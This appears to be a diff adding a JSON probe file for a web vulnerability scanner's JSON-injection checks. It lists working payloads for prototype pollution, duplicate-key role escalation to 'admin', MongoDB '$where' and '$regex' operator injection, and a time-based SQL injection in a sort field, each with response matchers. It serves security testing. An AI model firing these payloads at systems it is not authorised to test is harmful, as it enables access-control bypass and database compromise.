@@ -1,0 +1,104 @@
+{
+  "category": "json_injection",
+  "contexts": {
+    "prototype_key_injection": {
+      "description": "JSON key injection targeting prototype chain -- inject __proto__ or constructor keys to pollute object prototype in server-side JS",
+      "tech_match": ["Node.js", "Express", "Fastify", "Koa", "Deno"],
+      "param_match": ["data", "json", "body", "payload", "config", "settings", "preferences", "profile", "user", "options"],
+      "probes": [
+        {
+          "payload": "{\"__proto__\":{\"swktest\":\"{{marker}}\"}}",
+          "description": "JSON __proto__ injection -- if server merges input JSON into object without filtering, __proto__ key pollutes prototype",
+          "matchers": [
+            {"type": "status", "status": [200, 201]},
+            {"type": "not_word", "words": ["__proto__", "blocked", "invalid key"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 45
+        },
+        {
+          "payload": "{\"constructor\":{\"prototype\":{\"swktest\":\"{{marker}}\"}}}",
+          "description": "Constructor.prototype injection -- alternative prototype pollution path via constructor property",
+          "matchers": [
+            {"type": "status", "status": [200, 201]},
+            {"type": "not_word", "words": ["blocked", "invalid"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 45
+        }
+      ]
+    },
+    "interoperability": {
+      "description": "JSON interoperability issues -- exploit parser differences between front-end and back-end JSON handling",
+      "tech_match": [],
+      "param_match": ["data", "json", "body", "payload", "config"],
+      "probes": [
+        {
+          "payload": "{\"user\":\"admin\",\"user\":\"attacker\"}",
+          "description": "Duplicate key confusion -- different JSON parsers may take first or last value for duplicate keys, causing access control bypass",
+          "matchers": [
+            {"type": "status", "status": [200, 201]},
+            {"type": "word", "words": ["attacker", "admin"], "condition": "or"}
+          ],
+          "severity": "medium",
+          "confidence_boost": 35
+        },
+        {
+          "payload": "{\"role\":\"user\"  ,  \"role\":\"admin\"}",
+          "description": "Duplicate role key with whitespace -- last-wins parsers will use 'admin', first-wins will use 'user'",
+          "matchers": [
+            {"type": "status", "status": [200, 201]},
+            {"type": "length_diff", "min_diff": 20}
+          ],
+          "severity": "high",
+          "confidence_boost": 40
+        },
+        {
+          "payload": "{\"amount\":1e308}",
+          "description": "JSON numeric overflow -- Infinity value may bypass validation or cause unexpected behavior in financial calculations",
+          "matchers": [
+            {"type": "status", "status": [200, 500]},
+            {"type": "word", "words": ["Infinity", "overflow", "NaN", "error"], "condition": "or"}
+          ],
+          "severity": "medium",
+          "confidence_boost": 30
+        }
+      ]
+    },
+    "json_to_sql": {
+      "description": "JSON-to-SQL injection -- exploit JSON input that is incorporated into SQL queries without parameterization",
+      "tech_match": ["Node.js", "Python", "PHP", "Ruby", "Java"],
+      "param_match": ["filter", "where", "query", "search", "sort", "order", "field", "column", "criteria"],
+      "probes": [
+        {
+          "payload": "{\"filter\":{\"$where\":\"sleep(2000)\"}}",
+          "description": "MongoDB $where injection via JSON -- inject server-side JS execution via $where operator in NoSQL context",
+          "matchers": [
+            {"type": "timing", "min_ms": 2000}
+          ],
+          "severity": "high",
+          "confidence_boost": 60
+        },
+        {
+          "payload": "{\"sort\":\"id; SELECT pg_sleep(2)--\"}",
+          "description": "SQL injection via JSON sort parameter -- sort field value concatenated into ORDER BY clause",
+          "matchers": [
+            {"type": "timing", "min_ms": 2000}
+          ],
+          "severity": "high",
+          "confidence_boost": 55
+        },
+        {
+          "payload": "{\"filter\":{\"id\":{\"$gt\":\"\",\"$regex\":\".*\"}}}",
+          "description": "NoSQL operator injection via JSON -- inject MongoDB query operators through JSON input to bypass filters",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 100},
+            {"type": "status", "status": [200]}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        }
+      ]
+    }
+  }
+}
